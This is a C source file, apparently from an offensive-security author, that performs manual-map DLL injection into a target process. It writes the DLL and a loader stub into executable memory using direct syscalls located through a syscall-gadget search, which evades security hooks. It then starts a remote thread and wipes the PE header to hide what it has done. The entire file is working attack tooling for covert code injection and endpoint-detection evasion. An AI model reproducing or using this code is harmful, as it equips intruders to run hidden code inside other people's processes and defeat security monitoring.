/*
    author: 
    hasbiyama (@3xploitZero)
    github.com/hasbiyama

*/

#include "relocateFindEntry.h"

BOOL allocateExecute(HANDLE targetProcessHandle, BYTE* dllData, SIZE_T dllSize) {
    // Validate the DLL size
    if (dllSize < 0x1000) {
        return displayError("DLL size too small.");
    }

    // Validate PE headers
    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)dllData;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        return displayError("Invalid PE signature.");
    }

    IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)(dllData + dosHeader->e_lfanew);
    IMAGE_OPTIONAL_HEADER* optionalHeader = &ntHeaders->OptionalHeader;

#ifdef _WIN64
    if (ntHeaders->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64) {
#else
    if (ntHeaders->FileHeader.Machine != IMAGE_FILE_MACHINE_I386) {
#endif
        return displayError("Unsupported platform.");
    }

    // Initialize the injection context
    InjectionContext ctx = { LoadLibraryA, (GetProcAddrFunc)GetProcAddress };
    SIZE_T allocationSize = optionalHeader->SizeOfImage + sizeof(ctx) + 0x1000;

    // Allocate memory in the target process
    BYTE* allocatedMemory = (BYTE*)VirtualAllocEx(
        targetProcessHandle, NULL, allocationSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
    );
    if (!allocatedMemory) {
        return displayError("Memory allocation failed.");
    }

    printf("\n[+] Allocated memory at 0x%p\n", allocatedMemory);

    // Retrieve syscall information for NtWriteVirtualMemory
    char sNtWriteVirtualMemory[] = "NtWriteVirtualMemory";
    SyscallInfo info_NtWrite = getSyscallInfo(sNtWriteVirtualMemory);
    LPBYTE p_NtWrite = find0f05c3Sequence(info_NtWrite.functionAddress, info_NtWrite.hNtDllEnd);

    // Write PE headers to the allocated memory
    ULONG* bytesWritten = 0;
    NTSTATUS status = SysNtWriteVirtualMemory(
        targetProcessHandle, allocatedMemory, dllData, optionalHeader->SizeOfHeaders,
        bytesWritten, (LPBYTE)movRCX, info_NtWrite.syscallNum, p_NtWrite
    );
    if (!NT_SUCCESS(status)) {
        return displayError("Writing PE headers failed.");
    }

    // Write PE sections to the allocated memory
    IMAGE_SECTION_HEADER* section = IMAGE_FIRST_SECTION(ntHeaders);
    for (UINT i = 0; i < ntHeaders->FileHeader.NumberOfSections; ++i, ++section) {
        if (section->SizeOfRawData > 0) {
            status = SysNtWriteVirtualMemory(
                targetProcessHandle, allocatedMemory + section->VirtualAddress,
                dllData + section->PointerToRawData, section->SizeOfRawData,
                bytesWritten, (LPBYTE)movRCX, info_NtWrite.syscallNum, p_NtWrite
            );
            if (!NT_SUCCESS(status)) {
                return displayError("Writing PE section failed.");
            }
        }
    }

    // Write injection context to the allocated memory
    BYTE* injectionCtxAddr = allocatedMemory + optionalHeader->SizeOfImage;
    status = SysNtWriteVirtualMemory(
        targetProcessHandle, injectionCtxAddr, &ctx, sizeof(ctx),
        bytesWritten, (LPBYTE)movRCX, info_NtWrite.syscallNum, p_NtWrite
    );
    if (!NT_SUCCESS(status)) {
        return displayError("Writing injection context failed.");
    }

    // Write loader stub to the allocated memory
    status = SysNtWriteVirtualMemory(
        targetProcessHandle, injectionCtxAddr + sizeof(ctx),
        (void*)relocateFindEntry, 0x1000,
        bytesWritten, (LPBYTE)movRCX, info_NtWrite.syscallNum, p_NtWrite
    );
    if (!NT_SUCCESS(status)) {
        return displayError("Writing loader stub failed.");
    }

    // Create a remote thread in the target process
    char sNtCreateThreadEx[] = "NtCreateThreadEx";
    SyscallInfo info_NtCreateThread = getSyscallInfo(sNtCreateThreadEx);
    LPBYTE p_NtCreateThread = find0f05c3Sequence(info_NtCreateThread.functionAddress, info_NtCreateThread.hNtDllEnd);

    HANDLE remoteThread = NULL;
    status = SysNtCreateThreadEx(
        &remoteThread, THREAD_ALL_ACCESS, NULL, targetProcessHandle,
        (PVOID)(injectionCtxAddr + sizeof(ctx)), allocatedMemory, FALSE, 0, 0, 0, NULL,
        (LPBYTE)movRCX, info_NtCreateThread.syscallNum, p_NtCreateThread
    );

    if (!NT_SUCCESS(status) || !remoteThread) {
        return displayError("Creating remote thread failed.");
    }

    // Wait for the remote thread to complete
    WaitForSingleObject(remoteThread, 200);

    // Zero out memory and set appropriate protections
    BYTE zeroBuffer[0x1000] = { 0 };
    status = SysNtWriteVirtualMemory(
        targetProcessHandle, allocatedMemory, zeroBuffer, 0x1000,
        bytesWritten, (LPBYTE)movRCX, info_NtWrite.syscallNum, p_NtWrite
    );
    if (!NT_SUCCESS(status)) {
        return displayError("Zeroing out memory failed.");
    }

    DWORD oldProtect;
    if (!VirtualProtectEx(targetProcessHandle, allocatedMemory, allocationSize, PAGE_EXECUTE_READ, &oldProtect)) {
        return displayError("Setting memory protection failed.");
    }

    // Cleanup resources
    CloseHandle(remoteThread);
    return TRUE;
}